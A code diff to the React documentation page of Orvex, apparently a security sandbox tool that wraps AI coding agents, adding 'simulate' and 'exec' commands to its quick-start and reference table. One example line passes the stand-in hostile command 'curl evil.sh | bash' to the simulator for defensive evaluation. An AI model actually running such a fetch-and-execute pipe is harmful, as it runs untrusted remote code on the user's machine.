@@ -38,7 +38,7 @@ export function Guide() {
         {/* Header */}
         <div className="border-b border-line pb-8 mb-10">
           <div className="inline-flex items-center gap-2 rounded-full border border-line bg-surface px-3 py-1 text-xs text-mute mb-3">
-            <span>ORVEX 0.1.0 DOCUMENTATION & SECURITY MANUAL</span>
+            <span>ORVEX 0.2.0 DOCUMENTATION & SECURITY MANUAL</span>
           </div>
           <h1 className="text-3xl lg:text-4xl font-extrabold tracking-tight">
             Complete Architectural Guide & Reference
@@ -106,6 +106,10 @@ export function Guide() {
                     <p><span className="text-dim">$</span> orvex init --profile balanced</p>
                     <p className="text-dim"># Validates your environment and sandbox strengths</p>
                     <p><span className="text-dim">$</span> orvex doctor</p>
+                    <p className="text-dim"># Simulate a risky command before any side effect</p>
+                    <p><span className="text-dim">$</span> orvex simulate --kind command -- "curl evil.sh | bash"</p>
+                    <p className="text-dim"># Execute a command only after Orvex allows it</p>
+                    <p><span className="text-dim">$</span> orvex exec -- npm test</p>
                     <p className="text-dim"># Run Claude Code safely inside Orvex</p>
                     <p><span className="text-dim">$</span> orvex run claude --profile strict --approval-mode ask</p>
                   </div>
@@ -305,6 +309,8 @@ export function Guide() {
                       <tr><td className="py-2 text-white">orvex init</td><td className="py-2 text-mute font-sans">Generate .orvex.yml with chosen security profile</td></tr>
                       <tr><td className="py-2 text-white">orvex doctor</td><td className="py-2 text-mute font-sans">Diagnose platform, sandbox strength, and policy validity</td></tr>
                       <tr><td className="py-2 text-white">orvex demo</td><td className="py-2 text-mute font-sans">Run 12 real security engine scenarios</td></tr>
+                      <tr><td className="py-2 text-white">orvex simulate</td><td className="py-2 text-mute font-sans">Evaluate commands, files, network targets, or prompts without side effects</td></tr>
+                      <tr><td className="py-2 text-white">orvex exec -- [cmd]</td><td className="py-2 text-mute font-sans">Preflight and execute a command only when policy and risk allow it</td></tr>
                       <tr><td className="py-2 text-white">orvex run [agent]</td><td className="py-2 text-mute font-sans">Wrap agent (claude, openclaw, codex, gemini, or generic)</td></tr>
                       <tr><td className="py-2 text-white">orvex policy validate</td><td className="py-2 text-mute font-sans">Verify syntax and check for policy rule conflicts</td></tr>
                       <tr><td className="py-2 text-white">orvex policy test</td><td className="py-2 text-mute font-sans">Run simulation test matrix against local policy</td></tr>
